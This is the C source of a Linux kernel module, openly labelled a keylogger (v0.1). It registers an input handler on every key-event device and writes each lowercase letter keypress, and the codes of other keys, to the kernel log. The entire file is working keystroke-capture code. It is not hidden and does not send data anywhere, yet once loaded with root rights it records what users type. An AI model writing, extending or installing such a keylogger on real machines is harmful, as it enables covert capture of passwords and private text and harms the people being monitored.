#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/input.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Cagri Atalar");
MODULE_DESCRIPTION("Simple Input Subsystem Keylogger v0.1 - letters only ");
MODULE_VERSION("0.1");

/* Basit US QWERTY keymap (sadece küçük harfleri kapsar) */
static const char *keymap[] = {
    [16] = "q", [17] = "w", [18] = "e", [19] = "r",
    [20] = "t", [21] = "y", [22] = "u", [23] = "i",
    [24] = "o", [25] = "p",
    [30] = "a", [31] = "s", [32] = "d", [33] = "f",
    [34] = "g", [35] = "h", [36] = "j", [37] = "k",
    [38] = "l",
    [44] = "z", [45] = "x", [46] = "c", [47] = "v",
    [48] = "b", [49] = "n", [50] = "m"
};

/* input event callback */
static void keylogger_event(struct input_handle *handle,
                            unsigned int type,
                            unsigned int code,
                            int value)
{
    
    //printk(KERN_INFO "keylogger: type=%u, code=%u, value=%d\n", type, code, value); You can uncomment this line of code and see mouse etc. actvities
    if (type == EV_KEY && value == 1) { // sadece tuş basımı
        if (code < ARRAY_SIZE(keymap) && keymap[code])
            printk(KERN_INFO "keylogger: KEY: %s\n", keymap[code]);
        else
            printk(KERN_INFO "keylogger: UNKNOWN KEY: code=%u\n", code);
    }
}

static bool keylogger_filter(struct input_handle *handle,
                            unsigned int type,
                            unsigned int code,
                            int value)
{
    return false; 
}

/* input device register/unregister */
static struct input_handler keylogger_handler;

static int keylogger_connect(struct input_handler *handler,
                             struct input_dev *dev,
                             const struct input_device_id *id)
{
    struct input_handle *handle;
    int error;

    printk(KERN_INFO "keylogger: attempting to connect to device: %s\n",
           dev_name(&dev->dev));

    handle = kzalloc(sizeof(struct input_handle), GFP_KERNEL);
    if (!handle)
        return -ENOMEM;

    handle->dev = dev;
    handle->handler = handler;
    handle->name = "keylogger_handle";

    error = input_register_handle(handle);
    if (error) {
        printk(KERN_ERR "keylogger: failed to register handle\n");
        kfree(handle);
        return error;
    }

    error = input_open_device(handle);
    if (error) {
        printk(KERN_ERR "keylogger: failed to open device\n");
        input_unregister_handle(handle);
        kfree(handle);
        return error;
    }

    printk(KERN_INFO "keylogger: successfully connected to %s\n",
           dev_name(&dev->dev));
    return 0;
}

static void keylogger_disconnect(struct input_handle *handle)
{
    input_close_device(handle);
    input_unregister_handle(handle);
    kfree(handle);
    printk(KERN_INFO "keylogger: disconnected from device\n");
}

/* input device ID table - sadece klavye cihazlarını yakalar */
static const struct input_device_id keylogger_ids[] = {
    {
        .flags = INPUT_DEVICE_ID_MATCH_EVBIT,
        .evbit = { BIT_MASK(EV_KEY) },
    },
    { }, /* terminator */
};

static struct input_handler keylogger_handler = {
    .event = keylogger_event,
    .filter = keylogger_filter,
    .connect = keylogger_connect,
    .disconnect = keylogger_disconnect,
    .name = "keylogger_handler",
    .id_table = keylogger_ids,
};

/* modül init/exit */
static int __init keylogger_init(void)
{
    int ret;

    printk(KERN_INFO "keylogger: initializing module...\n");

    ret = input_register_handler(&keylogger_handler);
    if (ret) {
        printk(KERN_ERR "keylogger: failed to register input handler: %d\n", ret);
        return ret;
    }

    printk(KERN_INFO "keylogger: module loaded successfully\n");
    return 0;
}

static void __exit keylogger_exit(void)
{
    input_unregister_handler(&keylogger_handler);
    printk(KERN_INFO "keylogger: module unloaded\n");
}

module_init(keylogger_init);
module_exit(keylogger_exit);
